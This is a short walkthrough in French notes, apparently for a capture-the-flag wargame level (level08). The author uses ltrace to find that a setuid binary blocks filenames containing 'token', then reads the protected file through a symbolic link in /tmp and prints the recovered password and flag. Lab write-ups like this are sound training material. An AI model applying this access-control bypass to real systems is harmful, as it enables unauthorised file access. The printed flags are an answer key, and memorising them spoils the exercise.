ls -la
ex level08
et fichier token

cat token 
cat: token: Permission denied

ok donc 
./level08 
./level08 [file to read]
./level08 token 
You may not access 'token'

ok il faut trouver une solution

quand on fait ltrace ./level08 token

on peut voir 2 fonction appeler
strstr("token", "token")                                   = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)

un des 2 token de strstr doit etre fixe je vais essayer de cree un fichier vide pour le call

echo "" > /tmp/test
./level08 /tmp/test

j'ai rien mais si je ltrace
strstr("/tmp/test", "token")                                            = NULL
open("/tmp/test", 0, 014435162522)                                      = 3

on a token a null car il na pas la permission
il faut que je regarde comment je peu avoir la permission

j'ai trouver qu'on pouvais passer par un autre fichier qui aurait un lien avec le fichier bloquer
un lien symbolique rappel de pischine 

je vais donc tester
ln -s token /tmp/test2 (car test deja pris)
et ca marche enfin on a reussi a cree le lien let's try

./level08 /tmp/test2
VOILA
quif5eloekouj29ke0vouxean

bon ce n'est pas le getflag faut faire attention il faut 
su flag08
et getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f